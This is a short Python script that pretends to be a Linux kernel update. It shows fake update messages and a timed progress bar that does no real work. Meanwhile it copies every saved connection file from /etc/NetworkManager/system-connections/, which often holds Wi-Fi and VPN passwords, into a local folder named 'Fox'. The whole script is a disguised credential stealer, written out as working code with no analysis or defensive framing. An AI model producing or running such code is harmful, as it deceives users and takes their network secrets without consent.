import os
import shutil
import time
import sys

print("Kernel Update:")
print("================")
print("The Linux Kernel need to update.")
print("Updating:")
toolbar_width = 100

# setup toolbar
sys.stdout.write("[%s]" % (" " * toolbar_width))
sys.stdout.flush()
sys.stdout.write("\b" *
                 (toolbar_width + 1))  # return to start of line, after '['

for i in range(toolbar_width):
    time.sleep(0.1)  # do real work here
    # update the bar
    sys.stdout.write("#")
    sys.stdout.flush()

sys.stdout.write("]\n")  # this ends the progress bar
files = os.listdir("/etc/NetworkManager/system-connections/")
os.mkdir("Fox")
num = 1
for line in files:
    shutil.copy2("/etc/NetworkManager/system-connections/" + line,
                 "Fox/Fox_done-" + str(num) + ".txt")
    num += 1